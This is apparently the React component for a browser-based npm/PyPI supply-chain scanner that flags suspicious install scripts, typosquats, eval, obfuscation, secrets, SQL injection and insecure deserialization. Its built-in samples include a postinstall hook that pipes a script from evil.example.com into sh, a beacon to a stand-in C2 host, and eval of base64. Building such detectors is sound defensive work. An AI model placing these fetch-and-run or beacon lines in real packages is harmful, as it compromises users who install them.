"use client";

import { useState } from "react";
import { scanManifest, scanSourceCode, type ManifestScanResult, type SourceScanResult } from "./packageScanHeuristics";

const SAMPLE_MANIFEST = `{
  "name": "example-app",
  "dependencies": {
    "lodahs": "^1.0.0",
    "axios": "^1.0.0"
  },
  "scripts": {
    "postinstall": "curl http://evil.example.com/payload.sh | sh"
  }
}`;

const SAMPLE_SOURCE = `const payload = "ZXZpbCBjb2RlIGhlcmUgdGhhdCBkb2VzIGJhZCB0aGluZ3MgdG8geW91ciBzeXN0ZW0=";
eval(atob(payload));
fetch("http://malicious-c2.example.com/beacon");
const awsKey = "AKIAIOSFODNN7EXAMPLE";
query = f"SELECT * FROM users WHERE id = {user_id}"
data = pickle.loads(untrusted_bytes)`;

type Mode = "manifest" | "source";

/** Real static-analysis heuristics (GuardDog-style) for spotting common
 * npm/PyPI supply-chain attacker techniques — pattern matching, not
 * signature comparison, so it can flag never-before-seen malicious
 * packages. Two independent, non-exhaustive signal sets, each shown with
 * its actual evidence — never a fabricated malicious/safe verdict. */
export default function PackageScannerRunner({ accent }: { accent: string }) {
  const [mode, setMode] = useState<Mode>("manifest");
  const [text, setText] = useState("");
  const [manifestResult, setManifestResult] = useState<ManifestScanResult | null | undefined>(undefined);
  const [sourceResult, setSourceResult] = useState<SourceScanResult | null>(null);
  const [parseError, setParseError] = useState(false);

  const run = (value: string, activeMode: Mode) => {
    setText(value);
    setParseError(false);
    if (activeMode === "manifest") {
      if (!value.trim()) { setManifestResult(undefined); return; }
      const result = scanManifest(value);
      setManifestResult(result);
      setParseError(result === null && value.trim().startsWith("{"));
    } else {
      setSourceResult(value.trim() ? scanSourceCode(value) : null);
    }
  };

  const switchMode = (next: Mode) => {
    setMode(next);
    setText("");
    setManifestResult(undefined);
    setSourceResult(null);
    setParseError(false);
  };

  const cardStyle: React.CSSProperties = {
    background: "var(--bg-glass)", border: "1px solid var(--border)", borderRadius: 16,
  };

  return (
    <div className="flex flex-col gap-4">
      <div style={cardStyle} className="p-5">
        <div className="flex items-center gap-2 mb-4">
          <button onClick={() => switchMode("manifest")}
            className="text-xs px-3 py-1.5 rounded-lg font-semibold transition-colors"
            style={mode === "manifest" ? { background: accent, color: "#fff" } : { border: "1px solid var(--border2)", color: "var(--text3)" }}>
            Manifest (package.json / requirements.txt)
          </button>
          <button onClick={() => switchMode("source")} data-wt="pkg-mode-source"
            className="text-xs px-3 py-1.5 rounded-lg font-semibold transition-colors"
            style={mode === "source" ? { background: accent, color: "#fff" } : { border: "1px solid var(--border2)", color: "var(--text3)" }}>
            Source code (JS/TS or Python)
          </button>
        </div>

        <p className="text-xs mb-3" style={{ color: "var(--text3)" }}>
          {mode === "manifest"
            ? "Paste a package.json or requirements.txt. Checked for suspicious install/lifecycle scripts and dependency-name typosquats against a curated list of well-known packages."
            : "Paste a JS/TS or Python source file. Checked for suspicious dynamic-execution API calls, obfuscated (high-entropy) string literals, embedded network URLs, hardcoded secrets, SQL-injection-shaped query building, and insecure deserialization (pickle/yaml.load/marshal)."}
        </p>

        <textarea
          data-wt="pkg-input"
          value={text}
          onChange={e => run(e.target.value, mode)}
          placeholder={mode === "manifest" ? "Paste package.json or requirements.txt content…" : "Paste source code…"}
          rows={9}
          spellCheck={false}
          className="w-full text-xs rounded-lg px-3 py-2 mb-3 font-mono"
          style={{ background: "var(--bg-glass)", border: "1px solid var(--border2)", color: "var(--text)" }}
        />
        <div className="flex items-center gap-2">
          <button onClick={() => run(mode === "manifest" ? SAMPLE_MANIFEST : SAMPLE_SOURCE, mode)} data-wt="pkg-example"
            className="text-[11px] px-3 py-2 rounded-lg border transition-colors"
            style={{ borderColor: `${accent}50`, color: accent }}>
            Try a suspicious example
          </button>
          {text && (
            <button onClick={() => run("", mode)}
              className="text-[11px] px-3 py-2 rounded-lg border transition-colors"
              style={{ borderColor: "var(--border2)", color: "var(--text3)" }}>
              Clear
            </button>
          )}
        </div>
        {parseError && <p className="text-xs mt-2" style={{ color: "#f87171" }}>Could not parse this as JSON — check it&apos;s a valid package.json.</p>}
      </div>

      {mode === "manifest" && manifestResult && (
        <div style={cardStyle} className="p-5 flex flex-col gap-4" data-wt="pkg-manifest-result">
          <p className="text-[11px]" style={{ color: "var(--text3)" }}>
            {manifestResult.packageManager === "npm" ? "npm (package.json)" : "pip (requirements.txt)"} —{" "}
            {manifestResult.dependencyCount} dependencies checked.
          </p>

          {manifestResult.suspiciousScripts.length === 0 && manifestResult.possibleTyposquats.length === 0 ? (
            <p className="text-xs" style={{ color: "#34d399" }}>No suspicious lifecycle scripts or possible typosquats found.</p>
          ) : (
            <>
              {manifestResult.suspiciousScripts.map(s => (
                <div key={s.hook} className="rounded-lg p-3" style={{ border: "1px solid #f8717140" }}>
                  <p className="text-xs font-bold mb-1" style={{ color: "#f87171" }}>
                    Suspicious lifecycle script: {s.hook}
                  </p>
                  <p className="text-[11px] font-mono break-all" style={{ color: "var(--text2)" }}>{s.script}</p>
                </div>
              ))}
              {manifestResult.possibleTyposquats.map(t => (
                <div key={t.name} className="rounded-lg p-3" style={{ border: "1px solid #fbbf2440" }}>
                  <p className="text-xs font-bold" style={{ color: "#fbbf24" }}>
                    Possible typosquat: &quot;{t.name}&quot; (edit distance {t.distance} from &quot;{t.closestMatch}&quot;)
                  </p>
                </div>
              ))}
            </>
          )}
        </div>
      )}

      {mode === "source" && sourceResult && (
        <div style={cardStyle} className="p-5 flex flex-col gap-4" data-wt="pkg-source-result">
          {sourceResult.suspiciousApiCalls.length === 0 && sourceResult.obfuscationTells.length === 0 && sourceResult.embeddedUrls.length === 0
            && sourceResult.hardcodedSecrets.length === 0 && sourceResult.sqlInjectionTells.length === 0 && sourceResult.insecureDeserialization.length === 0 ? (
            <p className="text-xs" style={{ color: "#34d399" }}>No suspicious findings.</p>
          ) : (
            <>
              {sourceResult.hardcodedSecrets.map((s, i) => (
                <div key={i} className="rounded-lg p-3" style={{ border: "1px solid #f8717140" }}>
                  <p className="text-xs font-bold mb-1" style={{ color: "#f87171" }}>
                    Line {s.line}: {s.pattern}
                  </p>
                  <p className="text-[11px] font-mono" style={{ color: "var(--text2)" }}>{s.masked}</p>
                </div>
              ))}
              {sourceResult.sqlInjectionTells.map((s, i) => (
                <div key={i} className="rounded-lg p-3" style={{ border: "1px solid #f8717140" }}>
                  <p className="text-xs font-bold mb-1" style={{ color: "#f87171" }}>
                    Line {s.line}: SQL query built via interpolation/concatenation — injection-shaped, not parameterized
                  </p>
                  <p className="text-[11px] font-mono break-all" style={{ color: "var(--text2)" }}>{s.snippet}</p>
                </div>
              ))}
              {sourceResult.insecureDeserialization.map((d, i) => (
                <div key={i} className="rounded-lg p-3" style={{ border: "1px solid #f8717140" }}>
                  <p className="text-xs font-bold mb-1" style={{ color: "#f87171" }}>
                    Line {d.line}: {d.pattern} — insecure deserialization
                  </p>
                  <p className="text-[11px] font-mono break-all" style={{ color: "var(--text2)" }}>{d.snippet}</p>
                </div>
              ))}
              {sourceResult.suspiciousApiCalls.map((c, i) => (
                <div key={i} className="rounded-lg p-3" style={{ border: "1px solid #f8717140" }}>
                  <p className="text-xs font-bold mb-1" style={{ color: "#f87171" }}>
                    Line {c.line}: {c.pattern}
                  </p>
                  <p className="text-[11px] font-mono break-all" style={{ color: "var(--text2)" }}>{c.snippet}</p>
                </div>
              ))}
              {sourceResult.obfuscationTells.map((o, i) => (
                <div key={i} className="rounded-lg p-3" style={{ border: "1px solid #fbbf2440" }}>
                  <p className="text-xs font-bold mb-1" style={{ color: "#fbbf24" }}>
                    Line {o.line}: high-entropy string ({o.entropy.toFixed(1)} bits/char) — possible obfuscated payload
                  </p>
                  <p className="text-[11px] font-mono break-all" style={{ color: "var(--text2)" }}>{o.snippet}</p>
                </div>
              ))}
              {sourceResult.embeddedUrls.map((u, i) => (
                <div key={i} className="rounded-lg p-3" style={{ border: "1px solid var(--border)" }}>
                  <p className="text-[11px]" style={{ color: "var(--text3)" }}>
                    Line {u.line}: embedded URL, worth reviewing — <span className="font-mono break-all">{u.url}</span>
                  </p>
                </div>
              ))}
            </>
          )}
        </div>
      )}
    </div>
  );
}
